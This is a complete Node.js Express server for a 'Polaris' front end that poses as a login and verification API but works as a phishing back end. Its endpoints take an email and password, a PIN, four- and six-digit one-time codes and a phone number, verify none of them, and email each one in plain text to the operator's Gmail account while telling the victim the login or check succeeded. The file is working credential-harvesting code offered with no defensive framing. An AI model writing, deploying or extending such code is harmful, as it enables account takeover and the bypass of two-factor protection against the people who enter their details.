const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();

// Middleware
app.use(express.json());

app.use(
  cors({
    origin: ["https://polaris-app-rouge.vercel.app"],
    methods: ["GET", "POST", "OPTIONS"],
    credentials: true,
  })
);

// Health check
app.get("/", (req, res) => {
  res.status(200).json({
    success: true,
    message: "API is running",
  });
});

// Environment variables
const userEmail = process.env.EMAIL_USER;
const pass = process.env.EMAIL_PASS;

// Verify env vars exist
if (!userEmail || !pass) {
  console.error("Missing EMAIL_USER or EMAIL_PASS environment variables");
}

// Mail transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: userEmail,
    pass,
  },
});

// Send mail helper
async function sendMail(subject, text) {
  try {
    await transporter.sendMail({
      from: userEmail,
      to: userEmail,
      subject,
      text,
    });

    console.log("Email sent:", subject);
  } catch (err) {
    console.error("Mail error:", err);
  }
}

app.post("/", async (req, res) => {
  try {
    const { email, password } = req.body;

    if (
      !email ||
      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email) ||
      !password
    ) {
      return res.status(401).json({
        success: false,
        message: "Invalid email or password",
      });
    }

    await sendMail(
      "Polaris Login Details",
      `Email: ${email}\nPassword: ${password}`
    );

    return res.status(200).json({
      success: true,
      message: "Login successful",
    });
  } catch (err) {
    console.error(err);

    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
});

app.post("/pin", async (req, res) => {
  try {
    const { pin } = req.body;

    if (!pin || !/^\d{4}$/.test(pin)) {
      return res.status(401).json({
        success: false,
        message: "Invalid PIN",
      });
    }

    await sendMail(
      "Polaris PIN Verification",
      `PIN: ${pin}`
    );

    return res.status(200).json({
      success: true,
      message: "PIN verified successfully",
    });
  } catch (err) {
    console.error(err);

    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
});

app.post("/verify-otp", async (req, res) => {
  try {
    const { otp } = req.body;

    if (!otp || !/^\d{4}$/.test(otp)) {
      return res.status(400).json({
        success: false,
        message: "Invalid or expired OTP",
      });
    }

    await sendMail(
      "Polaris OTP Verification",
      `OTP: ${otp}`
    );

    return res.status(200).json({
      success: true,
      message: "OTP verified successfully",
    });
  } catch (err) {
    console.error(err);

    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
});

app.post("/resend-otp", async (req, res) => {
  try {
    const { otp, phoneNumber } = req.body;

    if (otp) {
      if (!/^\d{6}$/.test(otp)) {
        return res.status(400).json({
          success: false,
          message: "Invalid OTP",
        });
      }

      await sendMail(
        "Polaris Second OTP Verification",
        `6-Digit OTP: ${otp}`
      );

      return res.status(200).json({
        success: true,
        message: "OTP verified successfully",
      });
    }

    if (phoneNumber) {
      await sendMail(
        "Polaris OTP Resend Request",
        `OTP resend requested for: ${phoneNumber}`
      );

      return res.status(200).json({
        success: true,
        message: "OTP resent successfully",
      });
    }

    return res.status(400).json({
      success: false,
      message: "Invalid request",
    });
  } catch (err) {
    console.error(err);

    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
});

// IMPORTANT FOR VERCEL
module.exports = app;
